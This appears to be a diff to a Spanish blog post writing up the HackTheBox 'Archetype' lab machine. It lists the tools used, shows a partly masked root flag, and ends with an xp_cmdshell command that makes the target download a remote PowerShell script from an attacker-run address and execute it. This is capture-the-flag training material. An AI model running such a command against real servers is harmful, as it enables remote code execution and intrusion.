@@ -1,7 +1,7 @@
 ---
 layout: post
 title:  "Maquinas para empezar en HTB"
-description: En esta ocasion empezaremos con los Writeups de las maquina de StartingPoint  de HackTheBox
+description: En esta ocasion empezaremos con el Writeup de la maquina de StartingPoint de HackTheBox llamada ARCHETYPE
 tags: HTB, Empezando, Hacking, Starting
 ---
 
@@ -294,3 +294,11 @@ Procedemos a sacar la flag del administrador o root.txt
 "C:\Users\Administrator\Desktop>type root*    
 b91ccec3305e98240082d4474b------    "
 ```
+APRENDIDO:
+
+>> Uso de las herramientas:
+>> smbclient
+>> mssqlclient.py
+>> psexec.py
+>> Forma de injeccion de comandos despues de setear la configuracion de la opcion xp_cmdshell en Mysql
+>> COMMANDO xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.54/shell.ps1\");"
